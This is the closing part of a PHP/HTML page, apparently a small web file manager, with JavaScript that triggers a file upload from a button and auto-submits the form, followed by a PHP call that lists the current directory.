        // Trigger file upload when the "Upload File" button is clicked
        document.querySelector('.upload-btn').addEventListener('click', function(e) {
            e.preventDefault();
            document.getElementById('fileUpload').click();
        });

        // Automatically submit the form when a file is selected
        document.getElementById('fileUpload').addEventListener('change', function() {
            document.querySelector('.upload-form').submit();
        });
    </script>

    <!-- Directory Listing -->
    <?= listDirectories($currentDir) ?>
</body>
</html>